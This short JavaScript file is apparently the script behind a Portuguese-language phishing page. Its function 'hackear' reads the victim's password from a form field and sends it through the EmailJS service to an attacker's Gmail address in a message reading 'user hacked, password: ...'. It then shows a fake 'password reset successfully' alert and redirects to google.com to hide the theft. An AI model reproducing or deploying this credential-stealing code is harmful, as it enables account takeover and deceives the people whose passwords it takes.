emailjs.init({
  publicKey: "HfNHW9OuU4rH_PU3H"
});

function hackear() {
  let senha = document.querySelector("#senha").value
  
  emailjs.send("service_009e19g", "template_4epyull", {
    to_name: "Nome do Destinatário",
    from_name: "Seu Nome",
    message: `Usuário hackeado. Senha: ${senha}`,
    reply_to: "kingmastercllr@gmail.com"
  })
  .then(function(response) {
    console.log('SUCCESS!', response.status, response.text);
    alert('Senha redefinida com sucesso!');
    window.location.href = "https://google.com"
  }, function(error) {
    console.log('FAILED...', error);
    alert('Houve um erro, tente novamente.');
  });
}